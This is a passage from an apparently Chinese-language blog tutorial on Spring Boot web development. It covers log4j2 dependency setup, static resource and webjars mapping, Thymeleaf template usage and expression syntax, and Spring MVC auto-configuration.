class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">   <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">exclusions</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">exclusion</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-logging<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">exclusion</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">exclusions</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-log4j2<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><hr><h1 id="四、Web开发"><a href="#四、Web开发" class="headerlink" title="四、Web开发"></a>四、Web开发</h1><h2 id="1、简介"><a href="#1、简介" class="headerlink" title="1、简介"></a>1、简介</h2><p>使用SpringBoot；</p><p><strong>1）、创建SpringBoot应用，选中我们需要的模块；</strong></p><p><strong>2）、SpringBoot已经默认将这些场景配置好了，只需要在配置文件中指定少量配置就可以运行起来</strong></p><p><strong>3）、自己编写业务代码；</strong></p><p><strong>自动配置原理？</strong></p><p>这个场景SpringBoot帮我们配置了什么？能不能修改？能修改哪些配置？能不能扩展？xxx</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">xxxxAutoConfiguration：帮我们给容器中自动配置组件；</span><br><span class="line">xxxxProperties:配置类来封装配置文件的内容；</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><h2 id="2、SpringBoot对静态资源的映射规则；"><a href="#2、SpringBoot对静态资源的映射规则；" class="headerlink" title="2、SpringBoot对静态资源的映射规则；"></a>2、SpringBoot对静态资源的映射规则；</h2><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@ConfigurationProperties(prefix = "spring.resources", ignoreUnknownFields = false)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ResourceProperties</span> <span class="keyword">implements</span> <span class="title class_">ResourceLoaderAware</span> {</span><br><span class="line">  <span class="comment">//可以设置和静态资源有关的参数，缓存时间等</span></span><br></pre></td></tr></tbody></table></figure><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">WebMvcAuotConfiguration：</span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addResourceHandlers</span><span class="params">(ResourceHandlerRegistry registry)</span> {</span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">this</span>.resourceProperties.isAddMappings()) {</span><br><span class="line">logger.debug(<span class="string">"Default resource handling disabled"</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">}</span><br><span class="line"><span class="type">Integer</span> <span class="variable">cachePeriod</span> <span class="operator">=</span> <span class="built_in">this</span>.resourceProperties.getCachePeriod();</span><br><span class="line"><span class="keyword">if</span> (!registry.hasMappingForPattern(<span class="string">"/webjars/**"</span>)) {</span><br><span class="line">customizeResourceHandlerRegistration(</span><br><span class="line">registry.addResourceHandler(<span class="string">"/webjars/**"</span>)</span><br><span class="line">.addResourceLocations(</span><br><span class="line"><span class="string">"classpath:/META-INF/resources/webjars/"</span>)</span><br><span class="line">.setCachePeriod(cachePeriod));</span><br><span class="line">}</span><br><span class="line"><span class="type">String</span> <span class="variable">staticPathPattern</span> <span class="operator">=</span> <span class="built_in">this</span>.mvcProperties.getStaticPathPattern();</span><br><span class="line">         <span class="comment">//静态资源文件夹映射</span></span><br><span class="line"><span class="keyword">if</span> (!registry.hasMappingForPattern(staticPathPattern)) {</span><br><span class="line">customizeResourceHandlerRegistration(</span><br><span class="line">registry.addResourceHandler(staticPathPattern)</span><br><span class="line">.addResourceLocations(</span><br><span class="line"><span class="built_in">this</span>.resourceProperties.getStaticLocations())</span><br><span class="line">.setCachePeriod(cachePeriod));</span><br><span class="line">}</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">       <span class="comment">//配置欢迎页映射</span></span><br><span class="line"><span class="meta">@Bean</span></span><br><span class="line"><span class="keyword">public</span> WelcomePageHandlerMapping <span class="title function_">welcomePageHandlerMapping</span><span class="params">(</span></span><br><span class="line"><span class="params">ResourceProperties resourceProperties)</span> {</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">WelcomePageHandlerMapping</span>(resourceProperties.getWelcomePage(),</span><br><span class="line"><span class="built_in">this</span>.mvcProperties.getStaticPathPattern());</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">      <span class="comment">//配置喜欢的图标</span></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="meta">@ConditionalOnProperty(value = "spring.mvc.favicon.enabled", matchIfMissing = true)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">FaviconConfiguration</span> {</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> ResourceProperties resourceProperties;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">FaviconConfiguration</span><span class="params">(ResourceProperties resourceProperties)</span> {</span><br><span class="line"><span class="built_in">this</span>.resourceProperties = resourceProperties;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="meta">@Bean</span></span><br><span class="line"><span class="keyword">public</span> SimpleUrlHandlerMapping <span class="title function_">faviconHandlerMapping</span><span class="params">()</span> {</span><br><span class="line"><span class="type">SimpleUrlHandlerMapping</span> <span class="variable">mapping</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SimpleUrlHandlerMapping</span>();</span><br><span class="line">mapping.setOrder(Ordered.HIGHEST_PRECEDENCE + <span class="number">1</span>);</span><br><span class="line">             <span class="comment">//所有  **/favicon.ico </span></span><br><span class="line">mapping.setUrlMap(Collections.singletonMap(<span class="string">"**/favicon.ico"</span>,</span><br><span class="line">faviconRequestHandler()));</span><br><span class="line"><span class="keyword">return</span> mapping;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="meta">@Bean</span></span><br><span class="line"><span class="keyword">public</span> ResourceHttpRequestHandler <span class="title function_">faviconRequestHandler</span><span class="params">()</span> {</span><br><span class="line"><span class="type">ResourceHttpRequestHandler</span> <span class="variable">requestHandler</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ResourceHttpRequestHandler</span>();</span><br><span class="line">requestHandler</span><br><span class="line">.setLocations(<span class="built_in">this</span>.resourceProperties.getFaviconLocations());</span><br><span class="line"><span class="keyword">return</span> requestHandler;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p>==1）、所有 /webjars/** ，都去 classpath:/META-INF/resources/webjars/ 找资源；==</p><p>​    webjars：以jar包的方式引入静态资源；</p><p><a href="http://www.webjars.org/">http://www.webjars.org/</a></p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/59173/%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE20180203181751.png"></p><p>localhost:8080/webjars/jquery/3.3.1/jquery.js</p><figure class="highlight xml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--引入jquery-webjar--&gt;</span>在访问的时候只需要写webjars下面资源的名称即可</span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.webjars<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jquery<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">version</span>&gt;</span>3.3.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p>==2）、”/**” 访问当前项目的任何资源，都去（静态资源的文件夹）找映射==</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">"classpath:/META-INF/resources/", </span><br><span class="line">"classpath:/resources/",</span><br><span class="line">"classpath:/static/", </span><br><span class="line">"classpath:/public/" </span><br><span class="line">"/"：当前项目的根路径</span><br></pre></td></tr></tbody></table></figure><p>localhost:8080/abc ===  去静态资源文件夹里面找abc</p><p>==3）、欢迎页； 静态资源文件夹下的所有index.html页面；被”/**”映射；==</p><p>​    localhost:8080/   找index页面</p><p>==4）、所有的 **/favicon.ico  都是在静态资源文件下找；==</p><h2 id="3、模板引擎"><a href="#3、模板引擎" class="headerlink" title="3、模板引擎"></a>3、模板引擎</h2><p>JSP、Velocity、Freemarker、Thymeleaf</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/59173/template-engine.png"></p><p>SpringBoot推荐的Thymeleaf；</p><p>语法更简单，功能更强大；</p><h3 id="1、引入thymeleaf；"><a href="#1、引入thymeleaf；" class="headerlink" title="1、引入thymeleaf；"></a>1、引入thymeleaf；</h3><figure class="highlight xml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-thymeleaf<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">          2.1.6</span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">切换thymeleaf版本</span><br><span class="line"><span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">thymeleaf.version</span>&gt;</span>3.0.9.RELEASE<span class="tag">&lt;/<span class="name">thymeleaf.version</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 布局功能的支持程序  thymeleaf3主程序  layout2以上版本 --&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- thymeleaf2   layout1--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">thymeleaf-layout-dialect.version</span>&gt;</span>2.2.2<span class="tag">&lt;/<span class="name">thymeleaf-layout-dialect.version</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><h3 id="2、Thymeleaf使用"><a href="#2、Thymeleaf使用" class="headerlink" title="2、Thymeleaf使用"></a>2、Thymeleaf使用</h3><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@ConfigurationProperties(prefix = "spring.thymeleaf")</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ThymeleafProperties</span> {</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Charset</span> <span class="variable">DEFAULT_ENCODING</span> <span class="operator">=</span> Charset.forName(<span class="string">"UTF-8"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">MimeType</span> <span class="variable">DEFAULT_CONTENT_TYPE</span> <span class="operator">=</span> MimeType.valueOf(<span class="string">"text/html"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">DEFAULT_PREFIX</span> <span class="operator">=</span> <span class="string">"classpath:/templates/"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">DEFAULT_SUFFIX</span> <span class="operator">=</span> <span class="string">".html"</span>;</span><br><span class="line">  <span class="comment">//</span></span><br></pre></td></tr></tbody></table></figure><p>只要我们把HTML页面放在classpath:/templates/，thymeleaf就能自动渲染；</p><p>使用：</p><p>1、导入thymeleaf的名称空间</p><figure class="highlight xml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span> <span class="attr">xmlns:th</span>=<span class="string">"http://www.thymeleaf.org"</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p>2、使用thymeleaf语法；</p><figure class="highlight html"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span> <span class="attr">xmlns:th</span>=<span class="string">"http://www.thymeleaf.org"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>成功！<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--th:text 将div里面的文本内容设置为 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">th:text</span>=<span class="string">"${hello}"</span>&gt;</span>这是显示欢迎信息<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><h3 id="3、语法规则"><a href="#3、语法规则" class="headerlink" title="3、语法规则"></a>3、语法规则</h3><p>1）、th:text；改变当前元素里面的文本内容；</p><p>​    th：任意html属性；来替换原生属性的值</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/59173/2018-02-04_123955.png"></p><p>2）、表达式？</p><figure class="highlight properties"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">Simple</span> <span class="string">expressions:（表达式语法）</span></span><br><span class="line">    <span class="attr">Variable</span> <span class="string">Expressions: ${...}：获取变量值；OGNL；</span></span><br><span class="line">    <span class="attr">1）、获取对象的属性、调用方法</span></span><br><span class="line">    <span class="attr">2）、使用内置的基本对象：</span></span><br><span class="line"><span class="comment">    #ctx : the context object.</span></span><br><span class="line"><span class="comment">    #vars: the context variables.</span></span><br><span class="line"><span class="comment">                #locale : the context locale.</span></span><br><span class="line"><span class="comment">                #request : (only in Web Contexts) the HttpServletRequest object.</span></span><br><span class="line"><span class="comment">                #response : (only in Web Contexts) the HttpServletResponse object.</span></span><br><span class="line"><span class="comment">                #session : (only in Web Contexts) the HttpSession object.</span></span><br><span class="line"><span class="comment">                #servletContext : (only in Web Contexts) the ServletContext object.</span></span><br><span class="line">                </span><br><span class="line">                <span class="attr">${session.foo}</span></span><br><span class="line">            <span class="attr">3）、内置的一些工具对象：</span></span><br><span class="line"><span class="comment">#execInfo : information about the template being processed.</span></span><br><span class="line"><span class="comment">#messages : methods for obtaining externalized messages inside variables expressions, in the same way as they would be obtained using #{…} syntax.</span></span><br><span class="line"><span class="comment">#uris : methods for escaping parts of URLs/URIs</span></span><br><span class="line"><span class="comment">#conversions : methods for executing the configured conversion service (if any).</span></span><br><span class="line"><span class="comment">#dates : methods for java.util.Date objects: formatting, component extraction, etc.</span></span><br><span class="line"><span class="comment">#calendars : analogous to #dates , but for java.util.Calendar objects.</span></span><br><span class="line"><span class="comment">#numbers : methods for formatting numeric objects.</span></span><br><span class="line"><span class="comment">#strings : methods for String objects: contains, startsWith, prepending/appending, etc.</span></span><br><span class="line"><span class="comment">#objects : methods for objects in general.</span></span><br><span class="line"><span class="comment">#bools : methods for boolean evaluation.</span></span><br><span class="line"><span class="comment">#arrays : methods for arrays.</span></span><br><span class="line"><span class="comment">#lists : methods for lists.</span></span><br><span class="line"><span class="comment">#sets : methods for sets.</span></span><br><span class="line"><span class="comment">#maps : methods for maps.</span></span><br><span class="line"><span class="comment">#aggregates : methods for creating aggregates on arrays or collections.</span></span><br><span class="line"><span class="comment">#ids : methods for dealing with id attributes that might be repeated (for example, as a result of an iteration).</span></span><br><span class="line"></span><br><span class="line">    <span class="attr">Selection</span> <span class="string">Variable Expressions: *{...}：选择表达式：和${}在功能上是一样；</span></span><br><span class="line">    <span class="attr">补充：配合</span> <span class="string">th:object="${session.user}：</span></span><br><span class="line">   <span class="attr">&lt;div</span> <span class="string">th:object="${session.user}"&gt;</span></span><br><span class="line">    <span class="attr">&lt;p&gt;Name</span>: <span class="string">&lt;span th:text="*{firstName}"&gt;Sebastian&lt;/span&gt;.&lt;/p&gt;</span></span><br><span class="line">    <span class="attr">&lt;p&gt;Surname</span>: <span class="string">&lt;span th:text="*{lastName}"&gt;Pepper&lt;/span&gt;.&lt;/p&gt;</span></span><br><span class="line">    <span class="attr">&lt;p&gt;Nationality</span>: <span class="string">&lt;span th:text="*{nationality}"&gt;Saturn&lt;/span&gt;.&lt;/p&gt;</span></span><br><span class="line">    <span class="attr">&lt;/div&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="attr">Message</span> <span class="string">Expressions: #{...}：获取国际化内容</span></span><br><span class="line">    <span class="attr">Link</span> <span class="string">URL Expressions: @{...}：定义URL；</span></span><br><span class="line">    <span class="attr">@{/order/process(execId</span>=<span class="string">${execId},execType='FAST')}</span></span><br><span class="line">    <span class="attr">Fragment</span> <span class="string">Expressions: ~{...}：片段引用表达式</span></span><br><span class="line">    <span class="attr">&lt;div</span> <span class="string">th:insert="~{commons :: main}"&gt;...&lt;/div&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="attr">Literals（字面量）</span></span><br><span class="line">      <span class="attr">Text</span> <span class="string">literals: 'one text' , 'Another one!' ,…</span></span><br><span class="line">      <span class="attr">Number</span> <span class="string">literals: 0 , 34 , 3.0 , 12.3 ,…</span></span><br><span class="line">      <span class="attr">Boolean</span> <span class="string">literals: true , false</span></span><br><span class="line">      <span class="attr">Null</span> <span class="string">literal: null</span></span><br><span class="line">      <span class="attr">Literal</span> <span class="string">tokens: one , sometext , main ,…</span></span><br><span class="line"><span class="attr">Text</span> <span class="string">operations:（文本操作）</span></span><br><span class="line">    <span class="attr">String</span> <span class="string">concatenation: +</span></span><br><span class="line">    <span class="attr">Literal</span> <span class="string">substitutions: |The name is ${name}|</span></span><br><span class="line"><span class="attr">Arithmetic</span> <span class="string">operations:（数学运算）</span></span><br><span class="line">    <span class="attr">Binary</span> <span class="string">operators: + , - , * , / , %</span></span><br><span class="line">    <span class="attr">Minus</span> <span class="string">sign (unary operator): -</span></span><br><span class="line"><span class="attr">Boolean</span> <span class="string">operations:（布尔运算）</span></span><br><span class="line">    <span class="attr">Binary</span> <span class="string">operators: and , or</span></span><br><span class="line">    <span class="attr">Boolean</span> <span class="string">negation (unary operator): ! , not</span></span><br><span class="line"><span class="attr">Comparisons</span> <span class="string">and equality:（比较运算）</span></span><br><span class="line">    <span class="attr">Comparators</span>: <span class="string">&gt; , &lt; , &gt;= , &lt;= ( gt , lt , ge , le )</span></span><br><span class="line">    <span class="attr">Equality</span> <span class="string">operators: == , != ( eq , ne )</span></span><br><span class="line"><span class="attr">Conditional</span> <span class="string">operators:条件运算（三元运算符）</span></span><br><span class="line">    <span class="attr">If-then</span>: <span class="string">(if) ? (then)</span></span><br><span class="line">    <span class="attr">If-then-else</span>: <span class="string">(if) ? (then) : (else)</span></span><br><span class="line">    <span class="attr">Default</span>: <span class="string">(value) ?: (defaultvalue)</span></span><br><span class="line"><span class="attr">Special</span> <span class="string">tokens:</span></span><br><span class="line">    <span class="attr">No-Operation</span>: <span class="string">_ </span></span><br></pre></td></tr></tbody></table></figure><h2 id="4、SpringMVC自动配置"><a href="#4、SpringMVC自动配置" class="headerlink" title="4、SpringMVC自动配置"></a>4、SpringMVC自动配置</h2><p><a href="https://docs.spring.io/spring-boot/docs/1.5.10.RELEASE/reference/htmlsingle/#boot-features-developing-web-applications">https://docs.spring.io/spring-boot/docs/1.5.10.RELEASE/reference/htmlsingle/#boot-features-developing-web-applications</a></p><h3 id="1-Spring-MVC-auto-configuration"><a href="#1-Spring-MVC-auto-configuration" class="headerlink" title="1. Spring MVC auto-configuration"></a>1. Spring MVC auto-configuration</h3><p>Spring Boot 自动配置好了SpringMVC</p><p>以下是SpringBoot对SpringMVC的默认配置:<strong>==（WebMvcAutoConfiguration）==</strong></p><ul><li><p>Inclusion of <code>ContentNegotiatingViewResolver</code> and <code>BeanNameViewResolver</code> beans.</p><ul><li>自动配置了ViewResolver（视图解析器：根据方法的返回值得到视图对象（View），视图对象决定如何渲染（转发？重定向？））</li><li>ContentNegotiatingViewResolver：组合所有的视图解析器的；</li><li>==如何定制：我们可以自己给容器中添加一个视图解析器；自动的将其组合进来；==</li></ul></li><li><p>Support for serving static resources, including support for WebJars (see below).静态资源文件夹路径,webjars</p></li><li><p>Static <code>index.html</code> support. 静态首页访问</p></li><li><p>Custom <code>Favicon</code> support (see below).  favicon.ico</p></li><li><p>自动注册了 of <code>Converter</code>, <code>GenericConverter</code>, <code>Formatter</code> beans.</p><ul><li>Converter：转换器；  public String hello(User user)：类型转换使用Converter</li><li><code>Formatter</code>  格式化器；  2017.12.17===Date；</li></ul></li></ul><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Bean</span></span><br><span class="line"><span class="meta">@ConditionalOnProperty(prefix = "spring.mvc", name = "date-format")</span><span class="comment">//在文件中配置日期格式化的规则</span></span><br><span class="line"><span class="keyword">public</span> Formatter&lt;Date&gt; <span class="title function_">dateFormatter</span><span class="params">()</span> {</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">DateFormatter</span>(<span class="built_in">this</span>.mvcProperties.getDateFormat());<span class="comment">//日期格式化组件</span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>​    ==自己添加的格式化器转换器，我们只需要放在容器中即可==</p><ul><li><p>Support for <code>HttpMessageConverters</code> (see below).</p><ul><li><p>HttpMessageConverter：SpringMVC用来转换Http请求和响应的；User—Json；</p></li><li><p><code>HttpMessageConverters</code> 是从容器中确定；获取所有的HttpMessageConverter；</p><p>==自己给容器中添加HttpMessageConverter，只需要将自己的组件注册容器中（@Bean,@Component）==</p></li></ul></li><li><p>Automatic registration of <code>MessageCodesResolver</code> (see below).定义错误代码生成规则</p></li><li><p>Automatic use of a <code>ConfigurableWebBindingInitializer</code> bean (see below).</p><p>==我们可以配置一个ConfigurableWebBindingInitializer来替换默认的；（添加到容器）==</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">初始化WebDataBinder；</span><br><span class="line">请求数据=====JavaBean；</span><br></pre></td></tr></tbody></table></figure></li></ul><p><strong>org.springframework.boot.autoconfigure.web：web的所有自动场景；</strong></p><p>If you want to keep Spring Boot MVC features, and you just want to add additional <a href="https://docs.spring.io/spring/docs/4.3.14.RELEASE/spring-framework-reference/htmlsingle#mvc">MVC configuration</a> (interceptors, formatters, view controllers etc.) you can add your own <code>@Configuration</code> class of type <code>WebMvcConfigurerAdapter</code>, but <strong>without</strong> <code>@EnableWebMvc</code>. If you wish to provide custom instances of <code>RequestMappingHandlerMapping</code>, 